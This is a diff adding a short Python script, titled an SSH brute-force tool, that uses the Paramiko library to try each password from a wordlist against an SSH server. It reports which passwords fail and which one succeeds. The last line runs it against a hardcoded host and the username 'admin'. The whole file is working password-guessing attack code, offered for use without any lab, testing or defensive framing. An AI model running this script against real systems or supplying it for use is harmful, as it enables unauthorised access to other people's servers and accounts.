@@ -1,0 +1,24 @@
+# SSH Brute Force Tool (using Paramiko)
+#python
+
+import paramiko
+
+def ssh_brute_force(hostname, username, password_list):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    with open(password_list, 'r') as file:
+        for password in file:
+            password = password.strip()
+            try:
+                ssh.connect(hostname, username=username, password=password)
+                print(f"Successful login: {password}")
+                ssh.close()
+                return
+            except paramiko.AuthenticationException:
+                print(f"Failed: {password}")
+            except Exception as e:
+                print(f"Error: {e}")
+                return
+
+ssh_brute_force("10.0.0.1", "admin", "password_list.txt")
